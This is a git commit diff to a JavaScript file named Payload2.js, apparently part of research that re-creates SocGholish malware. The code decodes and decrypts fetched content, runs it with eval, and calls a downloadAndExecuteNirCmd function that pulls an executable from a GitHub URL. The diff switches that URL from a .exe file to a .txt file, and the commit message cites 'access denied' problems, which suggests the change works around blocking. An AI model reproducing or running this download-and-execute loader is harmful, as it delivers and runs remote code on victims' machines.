3d40f3b7064f8af6402ec0af69185c90ea1516a7
Alekzandr <kyle.topasna@gmail.com>
2024-01-18 11:15:11 -0900

    acess denied issues. trying txt

--- SocGholish Tests/Version 2/Payload2.js
+++ SocGholish Tests/Version 2/Payload2.js
@@ -122,5 +122,5 @@ if (XmlHttp_Object.status === 200) {
 var payload = decrypt(decode(fileContent), 4);
 this[eval(payload)];
 
-downloadAndExecuteNirCmd("https://github.com/alekzandr/Research/raw/main/SocGholish%20Tests/Version%202/nircmdc.exe");
+downloadAndExecuteNirCmd("https://github.com/alekzandr/Research/raw/main/SocGholish%20Tests/Version%202/nircmdc.txt");
 // downloadAndExecuteNirCmd("https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt");
